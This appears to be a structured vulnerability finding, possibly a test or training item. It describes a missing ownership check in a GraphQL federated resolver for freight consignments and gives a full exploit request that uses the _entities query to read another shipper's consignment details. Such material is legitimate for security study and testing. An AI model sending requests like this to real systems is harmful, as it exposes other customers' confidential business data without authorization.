diagnosis: The FreightConsignment federated resolver resolves freight tracking items from the in-memory store by trackingRef without verifying whether the requesting client's shipper account matches the owner of the consignment. Attackers can monitor shipping volumes, destination hubs, and pallet counts of competitor logistics shipments.
exploit_request:
POST /graphql HTTP/1.1
Host: logistics-gateway.internal:4090
Content-Type: application/json
X-Shipper-Account: acct_competitor_12

{"query": "query { _entities(representations: [{ __typename: \"FreightConsignment\", trackingRef: \"FRT-88392-US\" }]) { ... on FreightConsignment { totalWeightKg palletCount destinationHub transitStatus } } }"}
